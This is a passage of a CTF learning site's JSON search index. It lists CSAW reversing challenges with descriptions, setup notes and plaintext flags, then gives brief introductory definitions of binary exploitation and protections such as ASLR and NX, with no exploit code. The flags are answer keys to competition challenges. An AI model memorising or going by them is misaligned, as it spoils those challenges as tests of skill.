            "location": "/challenges/2017/reversing/gopherz/#description", 
            "text": "gopher://reversing.chal.csaw.io:7070", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/gopherz/#flag", 
            "text": "flag{tunnel_gopherz_ro0l}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/gopherz/#solution", 
            "text": "solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/grumpcheck/", 
            "text": "grumpcheck\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nnc server 7890\n\n\nFlag\n\n\nflag{python_doesnt_even_golang_here!}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \ngrumpcheck\n binary.", 
            "title": "grumpcheck"
        }, 
        {
            "location": "/challenges/2017/reversing/grumpcheck/#grumpcheck", 
            "text": "", 
            "title": "grumpcheck"
        }, 
        {
            "location": "/challenges/2017/reversing/grumpcheck/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/reversing/grumpcheck/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/grumpcheck/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/reversing/grumpcheck/#description", 
            "text": "nc server 7890", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/grumpcheck/#flag", 
            "text": "flag{python_doesnt_even_golang_here!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/grumpcheck/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/grumpcheck/#setup", 
            "text": "Distribute  grumpcheck  binary.", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/reversing/CyberTronix64k/", 
            "text": "CyberTronix64k (1)\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWe found a manual for a strange old machine in our closet, as well as a ROM. Can you figure out if there is is any way to log onto it?\n\n\nNote: The flag is marked with \nflag{XXXXX...}\n in memory, run against the remote instance to get the real flag!\n\n\nFlag\n\n\nflag{writing_disassemblers_is_fun}\n\n\nSolution\n\n\nsolve.py\n\n\nSetup\n\n\nDistribute:\n- \nct64_interpreter\n\n- \ndocs/CyberT.pdf\n (or a printout)\n- \ndistribute.rom\n\n\nRun with \nflags.rom", 
            "title": "CyberTronix64k"
        }, 
        {
            "location": "/challenges/2016/reversing/CyberTronix64k/#cybertronix64k-1", 
            "text": "", 
            "title": "CyberTronix64k (1)"
        }, 
        {
            "location": "/challenges/2016/reversing/CyberTronix64k/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/CyberTronix64k/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/CyberTronix64k/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/CyberTronix64k/#description", 
            "text": "We found a manual for a strange old machine in our closet, as well as a ROM. Can you figure out if there is is any way to log onto it?  Note: The flag is marked with  flag{XXXXX...}  in memory, run against the remote instance to get the real flag!", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/CyberTronix64k/#flag", 
            "text": "flag{writing_disassemblers_is_fun}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/CyberTronix64k/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/reversing/CyberTronix64k/#setup", 
            "text": "Distribute:\n-  ct64_interpreter \n-  docs/CyberT.pdf  (or a printout)\n-  distribute.rom  Run with  flags.rom", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/reversing/lazurus/", 
            "text": "Lazurus\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nLost but not forgotten, today we breathe new life into a peculiar world.\n\n\nFlag\n\n\nflag{exp3ct_a_w1nd0ws_p0six_pwn4ble_f0r_CSAW_2017_f1nals}\n\n\nSolution\n\n\nSimply run the executable with the correct flag as the first argument. You will need the SUA Subsystem enabled.\n\n\nNotes\n\n\nThis is a reversing challenge that is compiled for the old, Windows POSIX Subsystem.\nTo complete this challenge, it is expected that teams are going to have to have to\nactually get the executable running in the SUA 4.0 (Subsystem for Unix Applications)\nenvironment. This subsystem was shipped as a part of Windows from NT 4.0 - Windows 8.\n\n\nThe challenge uses fingerprints of the SUA environment to create/check the flag. It\nis unlikely that teams will be able to solve the challenge (at least relatively easily)\nwithout enabling the SUA subsystem on a Windows machine.\n\n\nThe reversing / flag logic is by no means complex. It is simply a byte xor of an\n'encrypted' flag and the collected environmental fingerprints. There is some basic\nobfuscation and anti-hexrays, along with some confusing code chunks to slowdown the\nfinalists and increase the difficulty of the challenge. Once they understand that\nsome chunks of code are just opaque predicates, they'll probably solve it pretty quickly.\n\n\nOther tidbits:\n- I developed the challenge on an x86 Windows 7 Enterprise VM\n- The challenge is 'environmentally keyed' to the SUA 4.0 Subsystem. It may not verify the flag properly on older versions.\n- It might be a bit tricky for teams to debug (good!) because the launch process of POSIX executables is indirect", 
            "title": "Lazurus"
        }, 
        {
            "location": "/challenges/2016/reversing/lazurus/#lazurus", 
            "text": "", 
            "title": "Lazurus"
        }, 
        {
            "location": "/challenges/2016/reversing/lazurus/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/lazurus/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/lazurus/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/lazurus/#description", 
            "text": "Lost but not forgotten, today we breathe new life into a peculiar world.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/lazurus/#flag", 
            "text": "flag{exp3ct_a_w1nd0ws_p0six_pwn4ble_f0r_CSAW_2017_f1nals}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/lazurus/#solution", 
            "text": "Simply run the executable with the correct flag as the first argument. You will need the SUA Subsystem enabled.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/reversing/lazurus/#notes", 
            "text": "This is a reversing challenge that is compiled for the old, Windows POSIX Subsystem.\nTo complete this challenge, it is expected that teams are going to have to have to\nactually get the executable running in the SUA 4.0 (Subsystem for Unix Applications)\nenvironment. This subsystem was shipped as a part of Windows from NT 4.0 - Windows 8.  The challenge uses fingerprints of the SUA environment to create/check the flag. It\nis unlikely that teams will be able to solve the challenge (at least relatively easily)\nwithout enabling the SUA subsystem on a Windows machine.  The reversing / flag logic is by no means complex. It is simply a byte xor of an\n'encrypted' flag and the collected environmental fingerprints. There is some basic\nobfuscation and anti-hexrays, along with some confusing code chunks to slowdown the\nfinalists and increase the difficulty of the challenge. Once they understand that\nsome chunks of code are just opaque predicates, they'll probably solve it pretty quickly.  Other tidbits:\n- I developed the challenge on an x86 Windows 7 Enterprise VM\n- The challenge is 'environmentally keyed' to the SUA 4.0 Subsystem. It may not verify the flag properly on older versions.\n- It might be a bit tricky for teams to debug (good!) because the launch process of POSIX executables is indirect", 
            "title": "Notes"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/", 
            "text": "supermonsterball - pit of doom\n\n\nAuthor\n\n\nVector 35\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nReversing\n\n\nDescription:\n\n\nA new craze is sweeping the nation -- Super Monster Ball. Join the revolution by downloading a client and pointing it at the server:  \nreversing.chal.csaw.io:1348\n\n\nFor this challenge, you must defeat the Monster master -- Professor Vick. You'll find him at the Pit of Doom, but you can only battle him once you've made it to level 40. Beat him, and you'll be rewarded with a flag. \n\n\nNOTE: Not recommended to try to solve by hand, you'll need to bot (HAX?!!), but don't get caught!\n\n\nFlag\n\n\nSolution\n\n\nsupermonsterball - catch em all\n\n\nAuthor\n\n\nVector 35\n\n\nPoints\n\n\n400\n\n\nDescription\n\n\nA new craze is sweeping the nation -- Super Monster Ball. Join the revolution by downloading a client and pointing it at the server:  \nreversing.chal.csaw.io:1348\n\n\nFor this challenge, just catch them all. Once you do, you'll be rewarded with a flag. \n\n\nNOTE: Not recommended to try to solve by hand, you'll need to bot (HAX?!!), but don't get caught!", 
            "title": "Supermonsterball"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#supermonsterball-pit-of-doom", 
            "text": "", 
            "title": "supermonsterball - pit of doom"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#author", 
            "text": "Vector 35", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#description", 
            "text": "A new craze is sweeping the nation -- Super Monster Ball. Join the revolution by downloading a client and pointing it at the server:   reversing.chal.csaw.io:1348  For this challenge, you must defeat the Monster master -- Professor Vick. You'll find him at the Pit of Doom, but you can only battle him once you've made it to level 40. Beat him, and you'll be rewarded with a flag.   NOTE: Not recommended to try to solve by hand, you'll need to bot (HAX?!!), but don't get caught!", 
            "title": "Description:"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#supermonsterball-catch-em-all", 
            "text": "", 
            "title": "supermonsterball - catch em all"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#author_1", 
            "text": "Vector 35", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#points_1", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/supermonsterball/#description_1", 
            "text": "A new craze is sweeping the nation -- Super Monster Ball. Join the revolution by downloading a client and pointing it at the server:   reversing.chal.csaw.io:1348  For this challenge, just catch them all. Once you do, you'll be rewarded with a flag.   NOTE: Not recommended to try to solve by hand, you'll need to bot (HAX?!!), but don't get caught!", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/Tar-Tar-Binks/", 
            "text": "Tar Tar Binks\n\n\nAuthor\n\n\nblankwall\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nMesa day startin pretty okee-day with a brisky morning munchy, then BOOM! Gettin very scared and grabbin that challenge and POW! Mesa thinks its very hard! Mesa gettin' very very confused!\n\nNote\n: The flag is the md5 sum of \nflag.txt\n\n\nFlag\n\n\nMD5 (key/solution.txt) = \n2c8cd31daeba8753815851f13e6370b3\n\n\nSolution\n\n\nsolution.txt", 
            "title": "Tar-Tar Binks"
        }, 
        {
            "location": "/challenges/2016/reversing/Tar-Tar-Binks/#tar-tar-binks", 
            "text": "", 
            "title": "Tar Tar Binks"
        }, 
        {
            "location": "/challenges/2016/reversing/Tar-Tar-Binks/#author", 
            "text": "blankwall", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/Tar-Tar-Binks/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/Tar-Tar-Binks/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/Tar-Tar-Binks/#description", 
            "text": "Mesa day startin pretty okee-day with a brisky morning munchy, then BOOM! Gettin very scared and grabbin that challenge and POW! Mesa thinks its very hard! Mesa gettin' very very confused! Note : The flag is the md5 sum of  flag.txt", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/Tar-Tar-Binks/#flag", 
            "text": "MD5 (key/solution.txt) =  2c8cd31daeba8753815851f13e6370b3", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/Tar-Tar-Binks/#solution", 
            "text": "solution.txt", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/reversing/ivninja/", 
            "text": "ivninja\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nAlright, lets be honest, Pokedex size does matter.\n\n\nFlag\n\n\nCSAW{KakunaRattataItMeansNoWorries}\n\n\nSolution\n\n\nsolution.png", 
            "title": "IV Ninja"
        }, 
        {
            "location": "/challenges/2016/reversing/ivninja/#ivninja", 
            "text": "", 
            "title": "ivninja"
        }, 
        {
            "location": "/challenges/2016/reversing/ivninja/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/ivninja/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/ivninja/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/ivninja/#description", 
            "text": "Alright, lets be honest, Pokedex size does matter.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/ivninja/#flag", 
            "text": "CSAW{KakunaRattataItMeansNoWorries}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/ivninja/#solution", 
            "text": "solution.png", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/reversing/return-of-the-wieners/", 
            "text": "Return of the Wieners\n\n\nAuthor\n\n\nAntoniewicz\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWieners was too hard last year so now it's been made easier.\nNote: The format for this challenge is key{}.\n\n\nFlag\n\n\nkey{imgur.com/DsQl4by}\n\n\nSolution\n\n\nSetup\n\n\nreturn_of_the_wieners_fdcfa9d04156803d4976693abe21aac1", 
            "title": "Return of the Wieners"
        }, 
        {
            "location": "/challenges/2015/reversing/return-of-the-wieners/#return-of-the-wieners", 
            "text": "", 
            "title": "Return of the Wieners"
        }, 
        {
            "location": "/challenges/2015/reversing/return-of-the-wieners/#author", 
            "text": "Antoniewicz", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/reversing/return-of-the-wieners/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/reversing/return-of-the-wieners/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/reversing/return-of-the-wieners/#description", 
            "text": "Wieners was too hard last year so now it's been made easier.\nNote: The format for this challenge is key{}.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/reversing/return-of-the-wieners/#flag", 
            "text": "key{imgur.com/DsQl4by}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/reversing/return-of-the-wieners/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/reversing/return-of-the-wieners/#setup", 
            "text": "return_of_the_wieners_fdcfa9d04156803d4976693abe21aac1", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/reversing/cookie-maze/", 
            "text": "cookie_maze\n\n\nAuthor\n\n\nBohan\n\n\nCategory\n\n\nReversing\n\n\nPoints\n\n\n400\n\n\nDescription\n\n\nEver feel like a rat trapped in a maze? There's a flag somewhere in this binary but I just can't seem to find it.\nIf you don't have a OS X box you can ssh here after requesting it.\nssh 0.tcp.ngrok.io -p 47136\n~Update new port is 47136\nHints:\n- \nhttps://www.mikeash.com/pyblog/friday-qa-2013-01-11-mach-exception-handlers.html\n\n- \nhttps://github.com/gdbinit/readmem\n\n- If an exception handler returns success(0) the binary continues executing even if the exception was not handled if it returns failure(5) it always exits\n\n\nFlag\n\n\nflag{Qi29a85i52aA5i5Ea15i81aM5i5Qa18i51aY5}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \ncookie_maze_8d8023f8f7c38181e8abd9c5c70d527b", 
            "title": "Cookie Maze"
        }, 
        {
            "location": "/challenges/2015/reversing/cookie-maze/#cookie_maze", 
            "text": "", 
            "title": "cookie_maze"
        }, 
        {
            "location": "/challenges/2015/reversing/cookie-maze/#author", 
            "text": "Bohan", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/reversing/cookie-maze/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/reversing/cookie-maze/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/reversing/cookie-maze/#description", 
            "text": "Ever feel like a rat trapped in a maze? There's a flag somewhere in this binary but I just can't seem to find it.\nIf you don't have a OS X box you can ssh here after requesting it.\nssh 0.tcp.ngrok.io -p 47136\n~Update new port is 47136\nHints:\n-  https://www.mikeash.com/pyblog/friday-qa-2013-01-11-mach-exception-handlers.html \n-  https://github.com/gdbinit/readmem \n- If an exception handler returns success(0) the binary continues executing even if the exception was not handled if it returns failure(5) it always exits", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/reversing/cookie-maze/#flag", 
            "text": "flag{Qi29a85i52aA5i5Ea15i81aM5i5Qa18i51aY5}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/reversing/cookie-maze/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/reversing/cookie-maze/#setup", 
            "text": "Distribute  cookie_maze_8d8023f8f7c38181e8abd9c5c70d527b", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/", 
            "text": "Pwning a Locked Container (P.L.C)\n\n\nAuthor\n\n\nDHS\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nPLC challenge round 2.\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
            "title": "Pwning a Locked Container"
        }, 
        {
            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#pwning-a-locked-container-plc", 
            "text": "", 
            "title": "Pwning a Locked Container (P.L.C)"
        }, 
        {
            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#author", 
            "text": "DHS", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#description", 
            "text": "PLC challenge round 2.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/reversing/pwning-a-locked-container-plc/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern/", 
            "text": "Wyvern\n\n\nAuthor\n\n\nD'antoine?\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nThere's a dragon afoot, we need a hero. Give us the dragon's secret and we'll give you a flag.\nHINT: static is only 1 of 2 methods to RE. IDA torrent unnecessary\n\n\nFlag\n\n\ndr4g0n_or_p4tric1an_it5_LLVM\n\n\nSolution\n\n\nSetup", 
            "title": "Wveryn"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern/#wyvern", 
            "text": "", 
            "title": "Wyvern"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern/#author", 
            "text": "D'antoine?", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern/#description", 
            "text": "There's a dragon afoot, we need a hero. Give us the dragon's secret and we'll give you a flag.\nHINT: static is only 1 of 2 methods to RE. IDA torrent unnecessary", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern/#flag", 
            "text": "dr4g0n_or_p4tric1an_it5_LLVM", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern2/", 
            "text": "wyvern2\n\n\nAuthor\n\n\nD'Antoine\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nThe dragon has returned! This time stronger....\nBrute strength has failed and now only magic can save us. Use your skills to defeat the dragon and win the princess.\n\n\nFlag\n\n\nflag{Sm0k_lub_p4trycju5z_j3st_LLVM2.o}\n\n\nSolution\n\n\nSetup\n\n\nwyvern2_9ea71d6a870c4f4e8f8e1859a0f628eb", 
            "title": "Wveryn 2"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern2/#wyvern2", 
            "text": "", 
            "title": "wyvern2"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern2/#author", 
            "text": "D'Antoine", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern2/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern2/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern2/#description", 
            "text": "The dragon has returned! This time stronger....\nBrute strength has failed and now only magic can save us. Use your skills to defeat the dragon and win the princess.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern2/#flag", 
            "text": "flag{Sm0k_lub_p4trycju5z_j3st_LLVM2.o}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern2/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/reversing/wyvern2/#setup", 
            "text": "wyvern2_9ea71d6a870c4f4e8f8e1859a0f628eb", 
            "title": "Setup"
        }, 
        {
            "location": "/binary-exploitation/introduction/", 
            "text": "Binary Exploitation\n\n\nBinaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions.\n\n\nCommon topics addressed by Binary Exploitation or 'pwn' challenges include:\n\n\n\n\nBuffers\n\n\nBuffer Overflow\n\n\n\n\n\n\nThe Stack\n\n\nRegisters\n\n\nCalling Conventions\n\n\nThe Heap\n\n\nHeap Overflow\n\n\n\n\n\n\nBinary Security\n\n\nNo eXecute (NX)\n\n\nData Execution Prevention\n\n\nAddress Space Layout Randomization (ASLR)\n\n\nRelocation Read-Only (RELRO)\n\n\nStack Canaries\n\n\n\n\n\n\nReturn to Lib C\n\n\nFormat String Vulnerability", 
            "title": "Introduction"
        }, 
        {
            "location": "/binary-exploitation/introduction/#binary-exploitation", 
            "text": "Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions.  Common topics addressed by Binary Exploitation or 'pwn' challenges include:   Buffers  Buffer Overflow    The Stack  Registers  Calling Conventions  The Heap  Heap Overflow    Binary Security  No eXecute (NX)  Data Execution Prevention  Address Space Layout Randomization (ASLR)  Relocation Read-Only (RELRO)  Stack Canaries    Return to Lib C  Format String Vulnerability", 
            "title": "Binary Exploitation"
        }, 
        {
            "location": "/binary-exploitation/what-are-buffers/", 
            "text": "Buffers\n\n\nA data buffer can really be considered as a temporarily allocated space in memory which is often used for storing user input.", 
            "title": "What are Buffers"
        }, 
        {
            "location": "/binary-exploitation/what-are-buffers/#buffers", 
            "text": "A data buffer can really be considered as a temporarily allocated space in memory which is often used for storing user input.", 
            "title": "Buffers"
        }, 
        {
            "location": "/binary-exploitation/buffer-overflow/", 
            "text": "Buffer Overflow\n\n\nA Buffer Overflow is a vulnerability in which data can be written which exceeds the allocated space, allowing an attacker to overwrite variables on the stack.", 
            "title": "Buffer Overflow"
        }, 
        {
            "location": "/binary-exploitation/buffer-overflow/#buffer-overflow", 
            "text": "A Buffer Overflow is a vulnerability in which data can be written which exceeds the allocated space, allowing an attacker to overwrite variables on the stack.", 
            "title": "Buffer Overflow"
        }, 
        {
            "location": "/binary-exploitation/what-is-the-stack/", 
            "text": "The Stack\n\n\nA stack is a data structure which follows the rule Last In, First Out (LIFO) and you push things to the top and pop things from the top.\n\n\nThe Stack Grows Down", 
            "title": "What is the Stack"
        }, 
        {
            "location": "/binary-exploitation/what-is-the-stack/#the-stack", 
            "text": "A stack is a data structure which follows the rule Last In, First Out (LIFO) and you push things to the top and pop things from the top.", 
            "title": "The Stack"
        }, 
        {
            "location": "/binary-exploitation/what-is-the-stack/#the-stack-grows-down", 
            "text": "", 
            "title": "The Stack Grows Down"
        }, 
        {
            "location": "/binary-exploitation/what-are-registers/", 
            "text": "Registers\n\n\nA \nregister\n is quite simply an allocated, fixed space of memory which is used by the program for quick computations. A register really acts as a general purpose local variable during the execution of a program.", 
            "title": "What are Registers"
        }, 
        {
            "location": "/binary-exploitation/what-are-registers/#registers", 
            "text": "A  register  is quite simply an allocated, fixed space of memory which is used by the program for quick computations. A register really acts as a general purpose local variable during the execution of a program.", 
            "title": "Registers"
        }, 
        {
            "location": "/binary-exploitation/what-are-calling-conventions/", 
            "text": "Calling Conventions", 
            "title": "What are Calling Conventions"
        }, 
        {
            "location": "/binary-exploitation/what-are-calling-conventions/#calling-conventions", 
            "text": "", 
            "title": "Calling Conventions"
        }, 
        {
            "location": "/binary-exploitation/what-is-the-heap/", 
            "text": "The Heap\n\n\nA \nheap\n is a data structure which is just a large allocation of dynamic memory which holds objects.", 
            "title": "What is the Heap"
        }, 
        {
            "location": "/binary-exploitation/what-is-the-heap/#the-heap", 
            "text": "A  heap  is a data structure which is just a large allocation of dynamic memory which holds objects.", 
            "title": "The Heap"
        }, 
        {
            "location": "/binary-exploitation/heap-overflow/", 
            "text": "Heap Overflow\n\n\nA \nheap overflow\n is a vulnerability where the allocation of a variable overlaps and can cause problems.", 
            "title": "Heap Overflow"
        }, 
        {
            "location": "/binary-exploitation/heap-overflow/#heap-overflow", 
            "text": "A  heap overflow  is a vulnerability where the allocation of a variable overlaps and can cause problems.", 
            "title": "Heap Overflow"
        }, 
        {
            "location": "/binary-exploitation/what-is-binary-security/", 
            "text": "Binary Security\n\n\nBinary Security is using tools and methods in order to secure programs from being manipulated and exploited. This tools are not infallible, but when used together and implemented properly, they can raise the difficulty of exploitation greatly.\n\n\nSome methods covered include:\n\n\n\n\nNo eXecute\n\n\nData Execution Prevention\n\n\nAddress Space Layout Randomization (ASLR)\n\n\nRelocation Read-Only (RELRO)\n\n\nStack Canaries/Cookies", 
            "title": "What is Binary Security"
        }, 
        {
            "location": "/binary-exploitation/what-is-binary-security/#binary-security", 
            "text": "Binary Security is using tools and methods in order to secure programs from being manipulated and exploited. This tools are not infallible, but when used together and implemented properly, they can raise the difficulty of exploitation greatly.  Some methods covered include:   No eXecute  Data Execution Prevention  Address Space Layout Randomization (ASLR)  Relocation Read-Only (RELRO)  Stack Canaries/Cookies", 
            "title": "Binary Security"
        }, 
        {
            "location": "/binary-exploitation/no-execute/", 
            "text": "No eXecute (NX Bit)\n\n\nThe No eXecute or the NX Bit marks certain areas of the program as not executable, meaning that stored input or data cannot be executed as code.", 
            "title": "No eXecute (NX)"
        }, 
        {
            "location": "/binary-exploitation/no-execute/#no-execute-nx-bit", 
            "text": "The No eXecute or the NX Bit marks certain areas of the program as not executable, meaning that stored input or data cannot be executed as code.", 
            "title": "No eXecute (NX Bit)"
        }, 
        {
            "location": "/binary-exploitation/data-execution-prevention/", 
            "text": "Data Execution Prevention (DEP)\n\n\nData Execution Prevention\n is the same thing as No eXecute where stack and heap memory areas are not executable.", 
            "title": "Data Execution Prevention"
        }, 
        {
            "location": "/binary-exploitation/data-execution-prevention/#data-execution-prevention-dep", 
            "text": "Data Execution Prevention  is the same thing as No eXecute where stack and heap memory areas are not executable.", 
            "title": "Data Execution Prevention (DEP)"
        }, 
        {
            "location": "/binary-exploitation/address-space-layout-randomization/", 
            "text": "Address Space Layout Randomization (ASLR)\n\n\nAddress Space Layout Randomization or ASLR is the method of randomizing where in memory the program is loaded in, making it hard for an attacker to guess where exactly the program's code is being loaded in. This is a partially effective way of preventing an attacker from jumping to, for example, lib c to a shell without a memory leak.", 
            "title": "Address Space Layout Randomization (ASLR)"
        }, 
        {
            "location": "/binary-exploitation/address-space-layout-randomization/#address-space-layout-randomization-aslr", 
            "text": "Address Space Layout Randomization or ASLR is the method of randomizing where in memory the program is loaded in, making it hard for an attacker to guess where exactly the program's code is being loaded in. This is a partially effective way of preventing an attacker from jumping to, for example, lib c to a shell without a memory leak.", 
            "title": "Address Space Layout Randomization (ASLR)"
        }, 
        {
            "location": "/binary-exploitation/relocation-read-only/", 
            "text": "Relocation Read-Only (RELRO)\n\n\nRelocation Read-Only or RELRO is a security measure which makes GOT Table address read-only after resolving them.", 
            "title": "Relocation Read-Only (RELRO)"
        }, 
        {
            "location": "/binary-exploitation/relocation-read-only/#relocation-read-only-relro", 
            "text": "Relocation Read-Only or RELRO is a security measure which makes GOT Table address read-only after resolving them.", 
            "title": "Relocation Read-Only (RELRO)"
        }, 
        {
            "location": "/binary-exploitation/stack-canaries/", 
